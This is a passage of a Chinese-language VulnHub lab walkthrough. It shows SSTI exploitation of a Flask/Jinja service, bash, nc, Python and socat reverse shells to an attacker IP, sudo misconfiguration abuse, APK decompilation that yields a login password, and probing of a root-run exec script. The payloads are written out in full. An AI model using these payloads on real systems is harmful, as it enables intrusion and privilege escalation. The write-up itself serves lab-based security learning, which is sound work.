stretchy=&#34;false&#34;&gt;!&lt;/mo&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mtext&gt;￼&lt;/mtext&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mo&gt;&amp;gt;&lt;/mo&gt;&lt;mo stretchy=&#34;false&#34;&gt;]&lt;/mo&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;:&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mn&gt;192.168.31.17&lt;/mn&gt;&lt;mo&gt;:&lt;/mo&gt;&lt;mn&gt;5000&lt;/mn&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mn&gt;4&lt;/mn&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;s?l333tt=100](http://192.168.31.17:5000/sh4d0w&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.5782em;vertical-align:-0.0391em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.77777em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.85396em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;￼&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.66666em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;s?l333tt=100)&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1259.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;命令成功被执行表示ssti模板注入漏洞是存在的&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#命令成功被执行表示ssti模板注入漏洞是存在的&#34;&gt;#&lt;/a&gt; 命令成功被执行，表示 SSTI 模板注入漏洞是存在的&lt;/h3&gt;
&lt;h3 id=&#34;如果不用浏览器进行渗透用终端进行命令行访问的话需要编码及转义&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#如果不用浏览器进行渗透用终端进行命令行访问的话需要编码及转义&#34;&gt;#&lt;/a&gt; 如果不用浏览器进行渗透，用终端进行命令行访问的话需要编码及转义&lt;/h3&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYmVqc29uLmNvbS9lbmMvdXJsZW5jb2RlLw==&#34;&gt;https://www.bejson.com/enc/urlencode/&lt;/span&gt; 上进行 url 编码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1260.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;curl &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTc6NTAwMC9zaDRkMHckcz9sMzMzdHQ9JTdCJTdCMTAqMTAlN0QlN0Q=&#34;&gt;http://192.168.31.17:5000/sh4d0w$s?l333tt=%7B%7B10*10%7D%7D&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1261.png&#34; alt&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;接下来就用这个模板的漏洞进行反弹shell，先用最基础的试试&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;% import os %&amp;#125;&amp;#123;&amp;#123;os.system(&amp;#x27;bash -c &amp;quot;bash -i &amp;gt;&amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/dev/tcp/192.168.31.99/4444 &amp;gt;&amp;amp;1&amp;quot;&amp;#x27;)&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;![](/N1h1l157/VULNHUB/image-1262.png)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;服务器返回了错误，得换其他的方式，用url编码尝试能否绕过&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;![](/N1h1l157/VULNHUB/image-1263.png)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;绕过失败，回显显示错误，shell没有反弹出来，当然curl可能因为编码和转&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;义的原因不太准确，不确定的话可以使用浏览器确认一下&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;![](/N1h1l157/VULNHUB/image-1264.png)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;span class=&#34;comment&#34;&gt;## 尝试用以下方式执行系统命令：&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123; config.__class__.__init__.__globals__[&amp;#x27;os&amp;#x27;].popen(&amp;#x27;ls -la&amp;#x27;).read() &amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;浏览器会默认对空格、引号等自动url编码，直接访问即可&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[http://192.168.31.17:5000/sh4d0w\$s?l333tt=&amp;#123;&amp;#123;%20config.__class__.__init__.__glob](http://192.168.31.17:5000/sh4d0w\$s?l333tt=&amp;#123;&amp;#123;%20config.__class__.__init__.__glob)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;als__[%&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;27os%27].popen(%27ls%20-la%27).&lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;()%20&amp;#125;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;![](/N1h1l157/VULNHUB/image-1265.png)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;命令执行成功，返回了ls - al命令的信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;判断目标站点是否存在nc、python、bash等可反弹shell的命令&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[http://192.168.31.17:5000/sh4d0w\$s?l333tt=&amp;#123;&amp;#123;%20config.__class__.__init__.__glob](http://192.168.31.17:5000/sh4d0w\$s?l333tt=&amp;#123;&amp;#123;%20config.__class__.__init__.__glob)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;als__[%&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;27os%27].popen(%27ls%20-la%27).&lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;()%20&amp;#125;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;![](/N1h1l157/VULNHUB/image-1266.png)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;用nc来反弹shell：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[http://192.168.31.17:5000/sh4d0w\$s?&amp;#123;&amp;#123;%20config.__class__.__init__.__globals__[](http://192.168.31.17:5000/sh4d0w\$s?&amp;#123;&amp;#123;%20config.__class__.__init__.__globals__[)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;27os%27].popen(%27nc%20192.168.31.99%204444%20-&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;e%&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;20/bin/bash%27).&lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;()%20&amp;#125;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;![](/N1h1l157/VULNHUB/image-1267.png)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;拿到 webshell 之后就是对其进行输出一个标准的 shell，就不多说了&lt;/p&gt;
&lt;h3 id=&#34;004-socat反弹shell用户组权限设置apk反编译&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#004-socat反弹shell用户组权限设置apk反编译&#34;&gt;#&lt;/a&gt; 004 socat 反弹 shell，用户组权限设置，apk 反编译&lt;/h3&gt;
&lt;p&gt;查看 sudo - l 时，看到可以无密码执行 kori 下的一个命令&lt;/p&gt;
&lt;p&gt;先无脑用 python 3 尝试一下能否反弹 shell 出来&lt;br&gt;
 sudo -u kori /bin/php/home/kori/jail.php python3 -c ‘import&lt;br&gt;
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3MuY28=&#34;&gt;s.co&lt;/span&gt;&lt;br&gt;
nnect((“192.168.31. 99 “,4445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fil&lt;br&gt;
eno(),2);p=subprocess.call([”/bin/sh”,&amp;quot;-i&amp;quot;]);’&lt;/p&gt;
&lt;p&gt;反弹失败了，查看 /home/kori/jail.php 文件，发现在 jail.php 文件中基本上&lt;br&gt;
能反弹 shell 的命令都给过滤掉了，包括一些特殊字符都不能在使用，我们能&lt;br&gt;
否绕过这些过滤信息，一旦绕过过滤，我们所输入的命令就会被执行&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1268.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;发现服务器上是存在 socat 命令的，socat 可以算做是高级一点的 nc，并且反&lt;br&gt;
弹 shell 的时候只需要分号不需要其他的特殊符号的参与，后面详细介绍&lt;br&gt;
 socat 的使用方法，这里先把 shell 反弹出来&lt;br&gt;
 nc - lvvp 3335&lt;br&gt;
sudo -u kori /bin/php /home/kori/jail.php socat exec:‘sh’,pty,stderr,setsid,sigint,sane&lt;br&gt;
tcp:192.168.31.99:4445&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1270.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;反弹后同样先获取一个标准的 tty，查看权限设置时看到了一条命令&lt;br&gt;
可调用 irida 用户用 cp 命令将其用户目录下的 irida.apk 文件拷贝到 kori 下&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1271.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;直接执行这条命令看会有什么样的回显产生&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#直接执行这条命令看会有什么样的回显产生&#34;&gt;#&lt;/a&gt; 直接执行这条命令，看会有什么样的回显产生&lt;/h3&gt;
&lt;p&gt;sudo -u irida /usr/bin/cp /home/irida/irida.apk /home/kori/irida.apk&lt;br&gt;
 发现权限不允许，通过 chmod o+w . 给其他用户添加写权限，再次复制成功了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1272.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;查看此文件的权限时，发现还是属于 irida 用户，如果我们先用 kori 用户创建&lt;br&gt;
 irida.apk 的文件，再将 irida 用户目录下的 apk 文件复制过来，那么最后得&lt;br&gt;
到的文件的权限就会归属于 kori 用户&lt;br&gt;
 rm - f irida.apk;touch irida.apk; chmod +777 irida.apk&lt;br&gt;
sudo -u irida /usr/bin/cp /home/irida/irida.apk /home/kori/irida.apk&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1273.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;将 apk 发送到一台 windows 虚拟机或者主机上，尝试反编译&lt;br&gt;
 scp irida.apk &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOmFkbWluaXN0cmF0b3JAMTkyLjE2OC4zMS4xNg==&#34;&gt;administrator@192.168.31.16&lt;/span&gt;:/E:/Desktop&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1274.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;在 github 上搜索得到 AndroidKiller 一款用来反编译 apk 的工具&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1275.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;用此工具打开 apk 文件即可自动的进行反编译&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1276.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;经过一段时间后，apk 被成功反编译为了 jar 文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1277.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;而 jar 文件是可以直接采用 IDEA 打开的，但是打开之后是不允许编辑的，可以&lt;br&gt;
借助 IDEA 工具对其源码进行审计，然后复制出关键的信息进行利用&lt;/p&gt;
&lt;h3 id=&#34;005-idea反编译jar-python输出hex-exec脚本反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#005-idea反编译jar-python输出hex-exec脚本反弹shell&#34;&gt;#&lt;/a&gt; 005 IDEA 反编译 jar、python 输出 hex ()、exec 脚本反弹 shell&lt;/h3&gt;
&lt;p&gt;在 jar 文件中找到一个登陆数据，调用了一个方法，将该方法的输出结果作为&lt;br&gt;
登陆进去的密码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1278.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;拉取这部分的代码执行构造的代码反向输出原有的密码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#拉取这部分的代码执行构造的代码反向输出原有的密码&#34;&gt;#&lt;/a&gt; 拉取这部分的代码，执行构造的代码，反向输出原有的密码&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1279.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;得到密码 eye.of.the.tiger (), 并且可依靠此密码登陆到 irida 用户下&lt;/p&gt;
&lt;p&gt;找到 irida 用户的一条用户权限设置错误，可调用 python 3 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1vcmFzLXBrNmhnNDVxLnB5&#34;&gt;执行 oras.py&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1280.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;但是现在的问题是没有权限去查看 oras.py 到底有什么内容，只能根据执行后&lt;br&gt;
的回显结果进行猜测&lt;br&gt;
 sudo /usr/bin/python3 /root/oras.py&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1281.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;需要输入一个参数并且错误信息提示我们需要输入的是一个十六进制的数据&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#需要输入一个参数并且错误信息提示我们需要输入的是一个十六进制的数据&#34;&gt;#&lt;/a&gt; 需要输入一个参数，并且错误信息提示我们需要输入的是一个十六进制的数据&lt;/h3&gt;
&lt;p&gt;用 python 3 调用十六进制，将 whoami 编码为十六进制&lt;br&gt;
 python3 -c “print (b&amp;quot;whoami”.hex ())&amp;quot; | sudo python3 /root/oras.pyi&lt;br&gt;
python3 -c 是在命令行执行 python 代码，上述命令表示用 python 3 在命令输出&lt;br&gt;
一个 whoami 的十六进制数据并将这个数据作为后面那个脚本的输入，字符串中&lt;br&gt;
的’b’字符前缀使变量成为字节类型。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1282.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;这里输了一些命令之后命令被挤掉了，说明 stty 设置的不够严谨，重新 reset&lt;br&gt;
 一下，stty 如何设置前面有介绍这里就直接利用&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1283.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;上述命令因为符号转义问题即括号的书写不规范导致命令错误这里不确定自&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#上述命令因为符号转义问题即括号的书写不规范导致命令错误这里不确定自&#34;&gt;#&lt;/a&gt; 上述命令因为符号转义问题即括号的书写不规范导致命令错误，这里不确定自&lt;/h3&gt;
&lt;h3 id=&#34;己的命令是否正确就分为了两部执行先打印出十六进制运行后面的脚&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#己的命令是否正确就分为了两部执行先打印出十六进制运行后面的脚&#34;&gt;#&lt;/a&gt; 己的命令是否正确，就分为了两部执行，先打印出十六进制，运行后面的脚&lt;/h3&gt;
&lt;h3 id=&#34;本并把十六进制数据作为后者的输入正常的写法为&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#本并把十六进制数据作为后者的输入正常的写法为&#34;&gt;#&lt;/a&gt; 本，并把十六进制数据作为后者的输入，正常的写法为&lt;/h3&gt;
&lt;p&gt;python3 -c “print(b&amp;quot;whoami”.hex())&amp;quot;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1284.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;将 whoami 的十六进制数据 77686f616d69 带入脚本中执行，看到报错代码内容&lt;br&gt;
为 exec（name），而 print (exec (‘whoami’)) 是错误的语法&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1285.png&#34; alt&gt;&lt;/p&gt;
